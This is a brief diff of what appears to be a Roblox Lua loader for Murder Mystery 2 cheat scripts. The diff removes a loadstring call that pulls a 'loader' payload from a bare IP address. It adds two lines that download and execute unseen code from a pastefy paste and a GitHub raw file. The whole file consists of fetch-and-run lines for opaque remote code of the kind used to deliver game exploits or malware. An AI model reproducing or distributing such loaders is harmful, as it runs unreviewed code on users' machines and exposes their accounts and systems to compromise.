@@ -1,4 +1,2 @@
-ID="4c78314a-bc55-43c0-9947-1c9db37afdab"
-RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/renardofficiel/game/refs/heads/main/MurderMystery2/main.lua", true))()
-
-loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjRjNzgzMTRhLWJjNTUtNDNjMC05OTQ3LTFjOWRiMzdhZmRhYiIsImtpbmQiOiJsb2FkZXIifQ"))()
+loadstring(game:HttpGet("https://pastefy.app/QExK4E7h/raw"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/renardofficiel/game/refs/heads/main/MurderMystery2/main.lua", true))()
